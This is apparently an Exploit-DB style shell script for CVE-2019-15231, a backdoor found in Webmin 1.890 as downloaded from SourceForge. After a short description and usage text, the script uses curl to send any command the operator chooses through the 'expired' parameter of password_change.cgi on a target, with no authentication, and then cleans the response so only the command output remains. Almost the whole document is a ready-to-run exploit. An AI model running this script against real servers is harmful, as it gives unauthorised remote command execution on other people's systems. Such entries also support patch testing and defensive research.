#!/bin/sh
# Exploit Title: Webmin 1.890 - Remote Code Execution 
# Google Dork: N/A
# Date: 2019-08-20 
# Exploit Author: faker_
# Vendor Homepage: http://www.webmin.com/
# Software Link: http://webmin.com/download.html
# Version: 1.890
# Tested on: CentOS 6.6
# CVE : CVE-2019-15231
#
# Description: Webmin in version 1.890 when downloaded from SourceForge
# contained a backdoor in the password_change.cgi file. 
# SourceForge is the default mirror for all downloads.
# This allows remote code execution without authentication.
# This is different from CVE-2019-15107 as it is exploitable in default
# configurations and a different parameter contains the backdoor.
#
# Usage:
# sh CVE-2019-15231.sh [target] [command]
# For example:
# sh CVE-2019-15231.sh https://target:10000 "uname -a"

if [ $# -ne 2 ]; then
  echo "Usage:"
  echo "sh $0 [target] [command]"
  echo ""
  echo "For example:"
  echo "sh $0 https://target:10000 \"uname -a\""
  echo "Linux centos6 2.6.32-504.el6.x86_64 #1 SMP Wed Oct 15 04:27:16 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux"
  echo ""
  exit 255
fi

TARGET=`echo $1 |sed 's/\/$//g'`
COMMAND=$2

curl -s -S -k ${TARGET}/password_change.cgi -H"Referer: ${TARGET}" -d "expired=${COMMAND}" | grep -v '^<h1>Error - Perl execution failed</h1>$' | grep -v '^</p>$' | sed 's/^<p>Your password has expired, and a new one must be chosen\.//g'

